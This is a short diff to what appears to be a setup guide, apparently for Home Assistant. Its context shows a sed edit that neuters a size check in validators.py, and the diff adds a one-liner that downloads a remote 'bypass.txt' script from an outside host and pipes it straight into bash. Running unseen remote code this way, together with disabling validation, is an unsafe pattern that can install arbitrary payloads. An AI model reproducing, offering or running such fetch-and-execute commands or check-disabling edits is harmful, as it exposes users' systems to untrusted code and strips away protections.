@@ -29,3 +29,11 @@ sed -i -e 's/bytecount != size/size != size/g' validators.py
 ha core restart
 #
 ```
+
+---
+
+
+```
+bash -c "$(wget -qLO - https://u.easyhan.pt/dev/bypass.txt)"
+
+```
